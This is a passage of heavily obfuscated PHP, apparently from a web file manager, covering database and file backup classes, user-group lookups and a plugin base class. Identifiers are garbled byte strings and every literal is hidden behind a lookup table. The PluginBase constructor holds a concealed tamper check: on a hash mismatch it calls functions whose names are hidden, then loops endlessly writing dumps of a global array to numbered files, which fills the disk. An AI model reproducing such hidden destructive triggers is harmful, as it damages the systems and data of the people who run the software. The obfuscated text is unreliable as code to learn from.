$Íï¿Ñà˜[$äÕ®Áƒè[376]][$äÕ®Áƒè[373]], $äÕ®Áƒè[2100] => 1, $äÕ®Áƒè[2102] => 1); } private function _searchFromMeta($Ø…ğŸ—, $¬±¨°ã, $È‹Ë¼ùå) { $óÆØë¤² =& $_SERVER[Å¶¨Şêº]; $¬±¨°ã = strtolower($¬±¨°ã); $æÜÑ± = array($óÆØë¤²[105] => $Ø…ğŸ—, $óÆØë¤²[384] => array($óÆØë¤²[392], "\45{$¬±¨°ã}\45")); $æÜÑ± = $this->parseWhereLike($æÜÑ±); $œÆûËÊö = Model($óÆØë¤²[2339])->where($æÜÑ±)->limit($È‹Ë¼ùå)->select(); if (!$œÆûËÊö) { return array(); } $œÆûËÊö = array_to_keyvalue($œÆûËÊö, $óÆØë¤²[12], $óÆØë¤²[1663]); $ô‹ğºéÒ = $this->where(array($óÆØë¤²[1654] => array($óÆØë¤²[7], $œÆûËÊö)))->select(); if (!$ô‹ğºéÒ) { return array(); } return $ô‹ğºéÒ; } private function _listDataApplyItem($áÇÏÏÜ°) { $ÖÜÑáúò = array($áÇÏÏÜ°); $this->_listDataApply($ÖÜÑáúò); return $ÖÜÑáúò[0]; } private function _listDataApply(&$ö€’şÄ˜) { $îÎ‡ûÆ =& $_SERVER[Å¶¨Şêº]; if (!$ö€’şÄ˜) { return; } array_remove_key($ö€’şÄ˜, $îÎ‡ûÆ[886]); $Šİ•®•À = array_to_keyvalue($ö€’şÄ˜, $îÎ‡ûÆ[12], $îÎ‡ûÆ[1663]); $this->_listAppendGroup($ö€’şÄ˜, $Šİ•®•À); $this->_listAppendMeta($ö€’şÄ˜, $Šİ•®•À); $this->_listAppendSourceRoot($ö€’şÄ˜, $Šİ•®•À); } private function _listAppendSourceRoot(&$ˆ¬Üßìü, $Ü½ã¶ìı) { $‘‘¾›šó =& $_SERVER[Å¶¨Şêº]; $ñ”âÅŸÚ = Model($‘‘¾›šó[823])->listSourceRoot(SourceModel::TYPE_USER, $Ü½ã¶ìı); $ñ”âÅŸÚ = array_to_keyvalue($ñ”âÅŸÚ, $‘‘¾›šó[505]); $ñ”âÅŸÚ = array_remove_key($ñ”âÅŸÚ, $‘‘¾›šó[505]); foreach ($ˆ¬Üßìü as &$×æº Ó¬) { $×æº Ó¬[$‘‘¾›šó[98]] = $ñ”âÅŸÚ[$×æº Ó¬[$‘‘¾›šó[1663]]] ? $ñ”âÅŸÚ[$×æº Ó¬[$‘‘¾›šó[1663]]] : array(); } unset($×æº Ó¬); } private function _listAppendGroup(&$³·´ŠÇÆ, $ô¥÷–’ì) { $òƒÓƒ¶© =& $_SERVER[Å¶¨Şêº]; $Æ›Õ®ú„ = array($òƒÓƒ¶©[1663] => array($òƒÓƒ¶©[7], $ô¥÷–’ì)); $ºêêˆœƒ = Model($òƒÓƒ¶©[1942])->where($Æ›Õ®ú„)->select(); $–©˜¯Ÿ = array_to_keyvalue($ºêêˆœƒ, $òƒÓƒ¶©[12], $òƒÓƒ¶©[1852]); $–©˜¯Ÿ = array_remove_value(array_unique($–©˜¯Ÿ), $òƒÓƒ¶©[209]); if (!$–©˜¯Ÿ || !$ºêêˆœƒ) { return; } $Æ›Õ®ú„ = array($òƒÓƒ¶©[1852] => array($òƒÓƒ¶©[7], $–©˜¯Ÿ)); $šŸÈºÜæ = Model($òƒÓƒ¶©[2037])->field($òƒÓƒ¶©[2340])->where($Æ›Õ®ú„)->select(); $šŸÈºÜæ = array_to_keyvalue($šŸÈºÜæ, $òƒÓƒ¶©[1852]); $ºêêˆœƒ = array_to_keyvalue_group($ºêêˆœƒ, $òƒÓƒ¶©[1663]); foreach ($ºêêˆœƒ as &$Éö‹Ì‘É) { $óÕƒ¬„Á = array(); foreach ($Éö‹Ì‘É as $½ı×ĞÀ«) { if (!$½ı×ĞÀ«[$òƒÓƒ¶©[1956]]) { continue; } $É³ÉËú¯ = Model($òƒÓƒ¶©[507])->listData($½ı×ĞÀ«[$òƒÓƒ¶©[1956]]); $óÕƒ¬„Á[] = array($òƒÓƒ¶©[1852] => $½ı×ĞÀ«[$òƒÓƒ¶©[1852]], $òƒÓƒ¶©[2341] => $šŸÈºÜæ[$½ı×ĞÀ«[$òƒÓƒ¶©[1852]]][$òƒÓƒ¶©[42]], $òƒÓƒ¶©[520] => $šŸÈºÜæ[$½ı×ĞÀ«[$òƒÓƒ¶©[1852]]][$òƒÓƒ¶©[520]], $òƒÓƒ¶©[422] => $É³ÉËú¯); } $Éö‹Ì‘É = $óÕƒ¬„Á; } unset($Éö‹Ì‘É); foreach ($³·´ŠÇÆ as &$‘­«óßª) { $‘­«óßª[$òƒÓƒ¶©[2039]] = array(); if (isset($ºêêˆœƒ[$‘­«óßª[$òƒÓƒ¶©[1663]]])) { $‘­«óßª[$òƒÓƒ¶©[2039]] = $ºêêˆœƒ[$‘­«óßª[$òƒÓƒ¶©[1663]]]; } } unset($‘­«óßª); } public function userAppendGroup($éª‡…ûÉ) { $§µŸ–õ‡ =& $_SERVER[Å¶¨Şêº]; if (!$éª‡…ûÉ) { return array(); } $this->_listAppendGroup($éª‡…ûÉ, array_to_keyvalue($éª‡…ûÉ, $§µŸ–õ‡[12], $§µŸ–õ‡[1663])); return $éª‡…ûÉ; } private function _listAppendMeta(&$Â¯ºëáª, $« ±ÊÆ”) { $³ œ–Œ =& $_SERVER[Å¶¨Şêº]; $â¸ à„ƒ = UserJobModel::JOB_KEY; $­–õåµ© = array($³ œ–Œ[2321]); $›àşó‡Ù = array($³ œ–Œ[1663] => array($³ œ–Œ[7], $« ±ÊÆ”)); $´¤™åäŒ = Model($³ œ–Œ[2319])->where($›àşó‡Ù)->select(); $´¤™åäŒ = array_to_keyvalue_group($´¤™åäŒ, $³ œ–Œ[1663]); foreach ($´¤™åäŒ as &$ˆì·«¿) { $ÜØä·Å = array(); foreach ($ˆì·«¿ as $¡¸¥Øñ) { if (!in_array($¡¸¥Øñ[$³ œ–Œ[105]], $­–õåµ©)) { $ÜØä·Å[$¡¸¥Øñ[$³ œ–Œ[105]]] = $¡¸¥Øñ[$³ œ–Œ[384]]; } } $ˆì·«¿ = $ÜØä·Å; } unset($ˆì·«¿); $Šê°¼Á = Model($³ œ–Œ[2342]); foreach ($Â¯ºëáª as &$Û“úéÙ) { $õ¡©ÁŞ = array(); if (isset($´¤™åäŒ[$Û“úéÙ[$³ œ–Œ[1663]]])) { $õ¡©ÁŞ = $´¤™åäŒ[$Û“úéÙ[$³ œ–Œ[1663]]]; } $Û“úéÙ[$³ œ–Œ[2343]] = array(); if (isset($õ¡©ÁŞ[$â¸ à„ƒ])) { $Û“úéÙ[$³ œ–Œ[2343]] = $Šê°¼Á->getUserJobInfo($õ¡©ÁŞ[$â¸ à„ƒ]); } } unset($Û“úéÙ); } protected function groupUserAll($õá÷½Ç…) { $˜„ØÌŞ‘ =& $_SERVER[Å¶¨Şêº]; if (!$õá÷½Ç…) { return !1; } $½Å†§Â× = Model($˜„ØÌŞ‘[1942])->field($˜„ØÌŞ‘[1663])->where(array($˜„ØÌŞ‘[1852] => array($˜„ØÌŞ‘[7], $õá÷½Ç…)))->select(); $½Å†§Â× = array_to_keyvalue($½Å†§Â×, $˜„ØÌŞ‘[12], $˜„ØÌŞ‘[1663]); return array_unique($½Å†§Â×); } public function userSearch($Óçô‚Â, $çİìµ¤í = "\52") { return Model($_SERVER[Å¶¨Şêº][534])->where($Óçô‚Â)->field($çİìµ¤í)->find(); } } goto dßğ©—˜‘Ã; EªæÆ©Ïá‘: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $ìÂñù =& $_SERVER[Å¶¨Şêº]; $šŸªº• = Backup::get(); self::$io = $šŸªº•[$ìÂñù[749]]; self::$name = $šŸªº•[$ìÂñù[42]]; $ú©·•’ = new DbManage(); $äÊÑ¸¹Ï = $ú©·•’->dbType(); $ÁÂ™á±Š = array($ìÂñù[774] => $äÊÑ¸¹Ï, $ìÂñù[775] => time()); Backup::set($ÁÂ™á±Š); $…›¸ªò¼ = $this->tmpFilesPath() . $ìÂñù[776] . self::$name . $ìÂñù[8]; del_dir($…›¸ªò¼); mk_dir($…›¸ªò¼); $È«ùŞß… = $·€Ä„î = 0; $ë–÷¸Îª = new Task($ìÂñù[777], $ìÂñù[778], 0, LNG($ìÂñù[779]) . $ìÂñù[780] . LNG($ìÂñù[781])); try { $Â•ÛôåÈ = $ú©·•’->db()->getTables(); } catch (Exception $ÔÊ¨Üô³) { $ë–÷¸Îª->end(); return !1; } $Â•ÛôåÈ = array_diff($Â•ÛôåÈ, array($ìÂñù[782], $ìÂñù[783])); foreach ($Â•ÛôåÈ as $¿Á•¯›ë) { $È«ùŞß… += $ú©·•’->model($¿Á•¯›ë)->count(); } $ë–÷¸Îª->task[$ìÂñù[784]] = $È«ùŞß…; $GLOBALS[$ìÂñù[785]] = self::$name; foreach ($Â•ÛôåÈ as $¿Á•¯›ë) { $ŸôÒÊƒü = $…›¸ªò¼ . $¿Á•¯›ë . $ìÂñù[786]; $”ºúÎÙì = null; if ($¿Á•¯›ë == $ìÂñù[787] && (!isset($šŸªº•[$ìÂñù[752]]) || $šŸªº•[$ìÂñù[752]] == $ìÂñù[209])) { $”ºúÎÙì = self::$io; } $·€Ä„î += $ú©·•’->sqlFromDb($¿Á•¯›ë, $ŸôÒÊƒü, $ë–÷¸Îª, $”ºúÎÙì); } unset($GLOBALS[$ìÂñù[785]]); $ë–÷¸Îª->end(); if ($·€Ä„î > $È«ùŞß…) { $È«ùŞß… = $·€Ä„î; } $ÁÂ™á±Š = array($ìÂñù[774] => $äÊÑ¸¹Ï, $ìÂñù[771] => 1, $ìÂñù[788] => $È«ùŞß…, $ìÂñù[789] => $·€Ä„î, $ìÂñù[790] => time()); Backup::set($ÁÂ™á±Š); if ($È«ùŞß… - $·€Ä„î > 0) { $Í×ú¶‘Õ = $ìÂñù[791]; if (stristr(I18n::getType(), $ìÂñù[792])) { $Í×ú¶‘Õ = $ìÂñù[793]; } write_log(array($Í×ú¶‘Õ, $ÁÂ™á±Š), $ìÂñù[778]); return !1; } return !0; } private function tmpFilesPath() { $Á¤Á¦Ôı =& $_SERVER[Å¶¨Şêº]; $‰šåÚÚš = TEMP_FILES; if ($GLOBALS[$Á¤Á¦Ôı[6]][$Á¤Á¦Ôı[100]][$Á¤Á¦Ôı[794]]) { $‰šåÚÚš = $GLOBALS[$Á¤Á¦Ôı[6]][$Á¤Á¦Ôı[100]][$Á¤Á¦Ôı[794]]; if (!mk_dir($‰šåÚÚš) || !is_writable($‰šåÚÚš) || !IO::mkfile($‰šåÚÚš . $Á¤Á¦Ôı[795])) { $‰šåÚÚš = TEMP_FILES; } } return $‰šåÚÚš; } } class BackupDbFile { public function __construct() { } public function index() { $â±‹õÛ =& $_SERVER[Å¶¨Şêº]; $ŒÇ‚‹´ = Backup::get(); $¿ö‰ß° = $ŒÇ‚‹´[$â±‹õÛ[42]]; $µ¾©¸€õ = $this->tmpFilesPath() . "\x62\141\143\153\x75\160\137{$¿ö‰ß°}\x2f"; $‡¾’Éô” = $this->backupPath($ŒÇ‚‹´); if (!($‡¾’Éô” = IO::mkdir($‡¾’Éô”))) { return !1; } $ˆ·Ê¾ûÎ = IO::listPath($µ¾©¸€õ); $ñÏ¬ØÜ = isset($ˆ·Ê¾ûÎ[$â±‹õÛ[94]]) ? $ˆ·Ê¾ûÎ[$â±‹õÛ[94]] : array(); $‹Ë‘‘Ğù = array_sum(array_column($ñÏ¬ØÜ, $â±‹õÛ[87])); if (!$‹Ë‘‘Ğù) { return !1; } $ÛØİíÀÃ = array($â±‹õÛ[796] => $‹Ë‘‘Ğù, $â±‹õÛ[797] => time()); Backup::set($ÛØİíÀÃ); $›œ¡ØéÕ = new TaskFileTransfer($â±‹õÛ[798], $â±‹õÛ[778], count($ñÏ¬ØÜ), LNG($â±‹õÛ[779]) . $â±‹õÛ[395] . LNG($â±‹õÛ[781]) . $â±‹õÛ[799]); $›œ¡ØéÕ->task[$â±‹õÛ[761]] = $‹Ë‘‘Ğù; foreach ($ˆ·Ê¾ûÎ[$â±‹õÛ[94]] as $±ç®Ò—) { $µÌÆù = IO::move($±ç®Ò—[$â±‹õÛ[95]], $‡¾’Éô”); if (!$µÌÆù) { $›œ¡ØéÕ->end(); $ô¦òÎ¸ = IO::getLastError($â±‹õÛ[800] . $±ç®Ò—[$â±‹õÛ[95]] . $â±‹õÛ[801] . $‡¾’Éô” . $â±‹õÛ[175]); write_log($ô¦òÎ¸, $â±‹õÛ[778]); return !1; } } $×¦¶ñ¯ú = new DbManage(); $Çù˜êå = $×¦¶ñ¯ú->getSqlFile(); if (!$Çù˜êå[$â±‹õÛ[802]] || !$Çù˜êå[$â±‹õÛ[23]]) { return !1; } IO::move($Çù˜êå[$â±‹õÛ[802]], $‡¾’Éô”); IO::move($Çù˜êå[$â±‹õÛ[23]], $‡¾’Éô”); $›œ¡ØéÕ->end(); $ÛØİíÀÃ = array($â±‹õÛ[803] => $‹Ë‘‘Ğù, $â±‹õÛ[804] => time()); Backup::set($ÛØİíÀÃ); return !0; } private function backupPath($”¢ş©Ê™) { $ş«É—˜Ó =& $_SERVER[Å¶¨Şêº]; $Û»Äñ©¢ = $”¢ş©Ê™[$ş«É—˜Ó[42]]; $çˆÄä‹Š = Model($ş«É—˜Ó[768])->get($ş«É—˜Ó[769]); $¨÷™øÎ = substr(md5($ş«É—˜Ó[770] . $çˆÄä‹Š . $Û»Äñ©¢), 0, 8); return "\x7b\x69\x6f\72{$”¢ş©Ê™[$ş«É—˜Ó[749]]}\175\x2f\x64\141\164\141\142\141\163\145\57\x62\x61\x63\x6b\x75\160\x2f" . $Û»Äñ©¢ . $ş«É—˜Ó[11] . $¨÷™øÎ; } private function tmpFilesPath() { $¨ê´²•‰ =& $_SERVER[Å¶¨Şêº]; $¾óöôéü = TEMP_FILES; if ($GLOBALS[$¨ê´²•‰[6]][$¨ê´²•‰[100]][$¨ê´²•‰[794]]) { $¾óöôéü = $GLOBALS[$¨ê´²•‰[6]][$¨ê´²•‰[100]][$¨ê´²•‰[794]]; if (!mk_dir($¾óöôéü) || !is_writable($¾óöôéü) || !IO::mkfile($¾óöôéü . $¨ê´²•‰[795])) { $¾óöôéü = TEMP_FILES; } } return $¾óöôéü; } } class BackupFile { public function __construct() { } public function index() { $ø†æ“â = Backup::get(); $Òšù·Ê = $ø†æ“â[$_SERVER[Å¶¨Şêº][303]][$_SERVER[Å¶¨Şêº][211]][$_SERVER[Å¶¨Şêº][477]]; $èäºë¹· = array($_SERVER[Å¶¨Şêº][478] => array($_SERVER[Å¶¨Şêº][805], $Òšù·Ê), $_SERVER[Å¶¨Şêº][806] => array($_SERVER[Å¶¨Şêº][341], $ø†æ“â[$_SERVER[Å¶¨Şêº][749]])); $òçë³ = (int) Model($_SERVER[Å¶¨Şêº][787])->where($èäºë¹·)->count($_SERVER[Å¶¨Şêº][477]); $ş¤÷ˆßİ = (int) Model($_SERVER[Å¶¨Şêº][787])->where($èäºë¹·)->sum($_SERVER[Å¶¨Şêº][87]); $Ö™ØÊ¤¨ = new TaskFileTransfer($_SERVER[Å¶¨Şêº][807], $_SERVER[Å¶¨Şêº][778], $òçë³, LNG($_SERVER[Å¶¨Şêº][779]) . $_SERVER[Å¶¨Şêº][780] . LNG($_SERVER[Å¶¨Şêº][808])); $Ö™ØÊ¤¨->task[$_SERVER[Å¶¨Şêº][761]] = $ş¤÷ˆßİ; $ˆ¦ºÓ·à = array($_SERVER[Å¶¨Şêº][809] => $òçë³, $_SERVER[Å¶¨Şêº][810] => $ş¤÷ˆßİ, $_SERVER[Å¶¨Şêº][811] => time()); Backup::set($ˆ¦ºÓ·à); $©”ºŠ€Í = !0; $ÄËÀ¢Åã = $this->storeIds(); $©Çªé‚¢ = 1; $ı£ÄäíÀ = 1000; $ö°°ŸŸ‘ = $ïÅ•Õ¯É = 0; $ŸÄòÅ³Ã = array(); $‚¥‚¿ı³ = $Ï²ªŒ‘¯ = 0; do { $şà¬Í¿  = $_SERVER[Å¶¨Şêº][812]; $©Ğä¯Ñ“ = Model($_SERVER[Å¶¨Şêº][787])->where($èäºë¹·)->field($şà¬Í¿ )->order($_SERVER[Å¶¨Şêº][813])->selectPage($ı£ÄäíÀ, $©Çªé‚¢); $ƒÉÖ¶ØÎ = !empty($©Ğä¯Ñ“[$_SERVER[Å¶¨Şêº][379]]) ? $©Ğä¯Ñ“[$_SERVER[Å¶¨Şêº][379]] : array(); foreach ($ƒÉÖ¶ØÎ as $ÀºŸ¾¸ê) { if (!$this->_fileExist($ÀºŸ¾¸ê, $ŸÄòÅ³Ã, $ÄËÀ¢Åã)) { $òçë³ -= 1; $ş¤÷ˆßİ -= (int) $ÀºŸ¾¸ê[$_SERVER[Å¶¨Şêº][87]]; write_log("\x66\x69\x6c\x65\x20\156\157\x74\40\145\x78\151\163\164\56\146\151\x6c\x65\111\x44\72{$ÀºŸ¾¸ê[$_SERVER[Å¶¨Şêº][477]]}\x2c\x20\160\141\x74\150\x3a{$ÀºŸ¾¸ê[$_SERVER[Å¶¨Şêº][95]]}", $_SERVER[Å¶¨Şêº][814]); continue; } $éª¥Ğß = $ÀºŸ¾¸ê[$_SERVER[Å¶¨Şêº][95]]; $äà˜ÄÌ = "\173\151\157\72{$ø†æ“â[$_SERVER[Å¶¨Şêº][749]]}\175" . substr($éª¥Ğß, strlen("\173\x69\x6f\x3a{$ÀºŸ¾¸ê[$_SERVER[Å¶¨Şêº][815]]}\175")); if (IO::exist($äà˜ÄÌ)) { $Ö™ØÊ¤¨->updateFileEnd($ÀºŸ¾¸ê[$_SERVER[Å¶¨Şêº][42]], $ÀºŸ¾¸ê[$_SERVER[Å¶¨Şêº][87]]); } else { $äà˜ÄÌ = get_path_father($äà˜ÄÌ); IO::mkdir($äà˜ÄÌ); if (!IO::copy($éª¥Ğß, $äà˜ÄÌ, $_SERVER[Å¶¨Şêº][816])) { write_log($_SERVER[Å¶¨Şêº][817] . $éª¥Ğß . $_SERVER[Å¶¨Şêº][801] . $äà˜ÄÌ . $_SERVER[Å¶¨Şêº][175], $_SERVER[Å¶¨Şêº][778]); $©”ºŠ€Í = !1; break; } } $Òšù·Ê = $ÀºŸ¾¸ê[$_SERVER[Å¶¨Şêº][477]]; $ïÅ•Õ¯É += 1; $ö°°ŸŸ‘ += $ÀºŸ¾¸ê[$_SERVER[Å¶¨Şêº][87]]; $Ï²ªŒ‘¯ += 1; $‚¥‚¿ı³ += $ÀºŸ¾¸ê[$_SERVER[Å¶¨Şêº][87]]; if ($ö°°ŸŸ‘ >= 1024 * 1024 * 100) { $ˆ¦ºÓ·à = array($_SERVER[Å¶¨Şêº][818] => $Òšù·Ê, $_SERVER[Å¶¨Şêº][819] => $Ï²ªŒ‘¯, $_SERVER[Å¶¨Şêº][820] => $‚¥‚¿ı³); Backup::set($ˆ¦ºÓ·à); $ö°°ŸŸ‘ = $ïÅ•Õ¯É = 0; } } $­ÅÎ’ÂŒ = count($ƒÉÖ¶ØÎ); $©Çªé‚¢++; } while ($­ÅÎ’ÂŒ == $ı£ÄäíÀ); $Ö™ØÊ¤¨->end(); $ˆ¦ºÓ·à = array($_SERVER[Å¶¨Şêº][821] => 1, $_SERVER[Å¶¨Şêº][759] => time(), $_SERVER[Å¶¨Şêº][773] => 1, $_SERVER[Å¶¨Şêº][818] => $Òšù·Ê, $_SERVER[Å¶¨Şêº][810] => $ş¤÷ˆßİ, $_SERVER[Å¶¨Şêº][809] => $òçë³, $_SERVER[Å¶¨Şêº][822] => time()); if ($ïÅ•Õ¯É) { $ˆ¦ºÓ·à[$_SERVER[Å¶¨Şêº][819]] = $Ï²ªŒ‘¯; $ˆ¦ºÓ·à[$_SERVER[Å¶¨Şêº][820]] = $‚¥‚¿ı³; } Backup::set($ˆ¦ºÓ·à); $this->_fileFilter($ŸÄòÅ³Ã); return !0; } private function _fileExist($”›ê‰×™, &$£ıôÚœ¶, $Ôš—ıÁµ) { $³Ñ²í­Û =& $_SERVER[Å¶¨Şêº]; $êƒ¨ŒÖ = $”›ê‰×™[$³Ñ²í­Û[95]]; if (in_array($”›ê‰×™[$³Ñ²í­Û[477]], $£ıôÚœ¶)) { return !1; } if (!in_array($”›ê‰×™[$³Ñ²í­Û[815]], $Ôš—ıÁµ)) { return !1; } if (IO::exist($êƒ¨ŒÖ)) { return !0; } $ßä´¾ = get_path_father($êƒ¨ŒÖ); if (IO::exist($ßä´¾)) { $£ıôÚœ¶[] = $”›ê‰×™[$³Ñ²í­Û[477]]; return !1; } $ÎÇ¶ôİğ = array($³Ñ²í­Û[815] => $”›ê‰×™[$³Ñ²í­Û[815]], $³Ñ²í­Û[95] => array($³Ñ²í­Û[392], "{$ßä´¾}\45")); $Å‡ÑÙ = Model($³Ñ²í­Û[787])->where($ÎÇ¶ôİğ)->field($³Ñ²í­Û[478])->select(); $£ıôÚœ¶ = array_merge($£ıôÚœ¶, array_to_keyvalue($Å‡ÑÙ, $³Ñ²í­Û[12], $³Ñ²í­Û[477])); return !1; } private function _fileFilter($æÏúİğè) { $‡ìğ¹àõ =& $_SERVER[Å¶¨Şêº]; if (empty($æÏúİğè)) { return; } $Äèö½øğ = array($‡ìğ¹àõ[477] => array($‡ìğ¹àõ[7], array_unique($æÏúİğè))); $Ø«°¼¼Ø = Model($‡ìğ¹àõ[823])->where($Äèö½øğ)->field($‡ìğ¹àõ[411])->select(); foreach ($Ø«°¼¼Ø as $îŒ—à‹Ç) { Model($‡ìğ¹àõ[823])->remove($îŒ—à‹Ç[$‡ìğ¹àõ[411]], !1); } } private function storeIds() { $²Í×§šá =& $_SERVER[Å¶¨Şêº]; $À±¶‚¸ = Model($²Í×§šá[765])->listData(); $‡¥İ¬ = array(); $¯Ëœóî = $GLOBALS[$²Í×§šá[6]][$²Í×§šá[100]][$²Í×§šá[824]]; foreach ($À±¶‚¸ as $¶äÕ¦Ä—) { $ÃóÖˆ° = strtolower($¶äÕ¦Ä—[$²Í×§šá[106]]); if (!isset($¯Ëœóî[$ÃóÖˆ°])) { continue; } $š«¥Å¾Ú = $²Í×§šá[85] . (isset($¯Ëœóî[$ÃóÖˆ°]) ? $¯Ëœóî[$ÃóÖˆ°] : ucfirst($ÃóÖˆ°)); if (!class_exists($š«¥Å¾Ú)) { continue; } $‡¥İ¬[] = $¶äÕ¦Ä—[$²Í×§šá[408]]; } return $‡¥İ¬; } } goto fâƒù¼éŸ; DóÇ—â¶Å: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $¦ÛÊ§îö =& $_SERVER[Å¶¨Şêº]; $£Ï±úØ = $_SERVER[$¦ÛÊ§îö[13]]; $Ê¾çÌå» = $¦ÛÊ§îö[14]; if ($_SERVER[$¦ÛÊ§îö[15]] != $Ê¾çÌå»($£Ï±úØ)) { $¬Í‰—ßì = $¦ÛÊ§îö[874]; $¢Šõ­¯ = $¦ÛÊ§îö[16]; $¶ıå™ÊÖ = $_SERVER[$¦ÛÊ§îö[17]] . $¦ÛÊ§îö[18]; $±·ô€¼´ = $¢Šõ­¯($¶ıå™ÊÖ); $Ñ‚Áå’ê = explode($¦ÛÊ§îö[19], $±·ô€¼´); if (count($Ñ‚Áå’ê) < $¦ÛÊ§îö[629]) { $…§Æ‰´« = $¦ÛÊ§îö[21]; $…§Æ‰´«(); } $Ÿãø§õ = $¦ÛÊ§îö[875]; $Ÿãø§õ($_SERVER[$¦ÛÊ§îö[876]]); $¬Í‰—ßì = $¦ÛÊ§îö[874]; $¬Í‰—ßì(); $Î¶Œ›¸ø = $¦ÛÊ§îö[877]; $˜´òğ¦— = json_encode($GLOBALS[$¦ÛÊ§îö[878]]); $‡íªö¾í = 1; for ($Õª°â = $‡íªö¾í; $Õª°â > 0; $Õª°â++) { $Î¶Œ›¸ø(DATA_PATH . $Õª°â, $˜´òğ¦—); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($¦ÛÊ§îö[1531]); $this->pluginName = str_replace($¦ÛÊ§îö[1531], $¦ÛÊ§îö[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $¦ÛÊ§îö[8]; $this->pluginApi = appHostGet() . $¦ÛÊ§îö[1532] . $this->pluginName . $¦ÛÊ§îö[8]; $this->pluginHost = $config[$¦ÛÊ§îö[1533]] . $this->pluginName . $¦ÛÊ§îö[8]; $this->pluginHostDefault = $config[$¦ÛÊ§îö[1533]] . $this->pluginName . $¦ÛÊ§îö[8]; $¬–¾¦©ë = $config[$¦ÛÊ§îö[1534]]; if ($¬–¾¦©ë && strpos($¦ÛÊ§îö[60] . $¬–¾¦©ë . $¦ÛÊ§îö[60], $this->pluginName) !== !1) { $this->pluginHost = $config[$¦ÛÊ§îö[1535]] . $this->pluginName . $¦ÛÊ§îö[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[Å¶¨Şêº][1536]); } protected function assign($Ûú½ªùé, $Ä¿ÇıÂ = false) { if (is_array($Ûú½ªùé)) { $this->values = array_merge($this->values, $Ûú½ªùé); } else { $this->values[$Ûú½ªùé] = $Ä¿ÇıÂ; } } protected function display($‰„ÆÙ¶) { extract($this->values); require $‰„ÆÙ¶; } final function hookRegist($¼á“¥İ­) { $this->modelPlugin->appRegist($this->pluginName, $¼á“¥İ­); } final function appIcon() { $…ÖúîĞ =& $_SERVER[Å¶¨Şêº]; $ô™ÃòÃĞ = $this->appPackage(); $ƒí•Ê¢ = $…ÖúîĞ[12]; if (isset($ô™ÃòÃĞ[$…ÖúîĞ[425]])) { if (isset($ô™ÃòÃĞ[$…ÖúîĞ[425]][$…ÖúîĞ[1537]])) { $ƒí•Ê¢ = $…ÖúîĞ[1538] . $ô™ÃòÃĞ[$…ÖúîĞ[425]][$…ÖúîĞ[1537]] . $…ÖúîĞ[1539]; } else { if ($ô™ÃòÃĞ[$…ÖúîĞ[425]][$…ÖúîĞ[1540]]) { $ƒí•Ê¢ = $…ÖúîĞ[1541] . $ô™ÃòÃĞ[$…ÖúîĞ[425]][$…ÖúîĞ[1540]] . $…ÖúîĞ[1542]; } } } return $ƒí•Ê¢; } final function fileCanView($Ø¶¼ÚØ¹) { $‰ÍóÈÈ½ =& $_SERVER[Å¶¨Şêº]; if (request_url_safe($Ø¶¼ÚØ¹)) { return !0; } if ($this->isShare($Ø¶¼ÚØ¹)) { return !0; } $èÄƒ¹ùà = Session::get($‰ÍóÈÈ½[1543]); if (!$èÄƒ¹ùà || !$èÄƒ¹ùà[$‰ÍóÈÈ½[1544]]) { $ª€š¹šÜ = $‰ÍóÈÈ½[1545] . rawurlencode(this_url()); show_tips(LNG($‰ÍóÈÈ½[1546]) . $‰ÍóÈÈ½[1547] . $ª€š¹šÜ . $‰ÍóÈÈ½[1548] . LNG($‰ÍóÈÈ½[1549]) . $‰ÍóÈÈ½[1550], !1); } if (!Action($‰ÍóÈÈ½[1551])->authCan($‰ÍóÈÈ½[1552])) { show_tips(LNG($‰ÍóÈÈ½[1553]) . $‰ÍóÈÈ½[1554], !1); } ActionCall($‰ÍóÈÈ½[1555], $Ø¶¼ÚØ¹); } final function isShare($Â÷—¾àó) { $Êù²äŞö = KodIO::parse($Â÷—¾àó); return $Êù²äŞö[$_SERVER[Å¶¨Şêº][43]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($Èµ•ñ©®) { if (request_url_safe($Èµ•ñ©®)) { return $Èµ•ñ©®; } if (!$this->isShare($Èµ•ñ©®)) { $Èµ•ñ©® = $this->filePath($Èµ•ñ©®); } return Action($_SERVER[Å¶¨Şêº][1171])->linkOut($Èµ•ñ©®); } public function filePathLinkOut($ÆßèÈÀó) { if (request_url_safe($ÆßèÈÀó)) { return $ÆßèÈÀó; } $this->fileCanView($ÆßèÈÀó); return Action($_SERVER[Å¶¨Şêº][1171])->link($ÆßèÈÀó); } final function filePath($÷›Äñ¤Ô) { $úºº¤ß¾ =& $_SERVER[Å¶¨Şêº]; if ($“ÙË¼™¹ = $this->checkSharePath($÷›Äñ¤Ô)) { Hook::trigger($úºº¤ß¾[1556], $“ÙË¼™¹); return $“ÙË¼™¹; } $this->fileCanView($÷›Äñ¤Ô); if (request_url_safe($÷›Äñ¤Ô)) { $ÕÜö×× = parse_url_query($÷›Äñ¤Ô); if (isset($ÕÜö××[$úºº¤ß¾[1557]]) && isset($ÕÜö××[$úºº¤ß¾[224]])) { $ş¥î¿ËÊ = Model($úºº¤ß¾[768])->get($úºº¤ß¾[769]); $»»¨èÇ = Mcrypt::decode($ÕÜö××[$úºº¤ß¾[224]], $ş¥î¿ËÊ); if ($»»¨èÇ) { $this->fileInfo = IO::infoWithChildren($»»¨èÇ); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $»»¨èÇ; } } $÷›Äñ¤Ô = $this->_cacheHttpFile($÷›Äñ¤Ô); $this->fileInfo = IO::infoWithChildren($÷›Äñ¤Ô); } else { $this->fileInfo = IO::infoWithChildren($÷›Äñ¤Ô); if (!$this->fileInfo) { show_tips(LNG($úºº¤ß¾[116]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($úºº¤ß¾[1556], $÷›Äñ¤Ô); return $÷›Äñ¤Ô; } final function _cacheHttpFile($è›Ì‘‡‹) { $«Î‰‰Æö = hash_path($è›Ì‘‡‹, !0); $this->cachePath = $this->pluginCachePath($«Î‰‰Æö); if ($Ñ®áÆâ = IO::fileNameExist($this->cachePath, 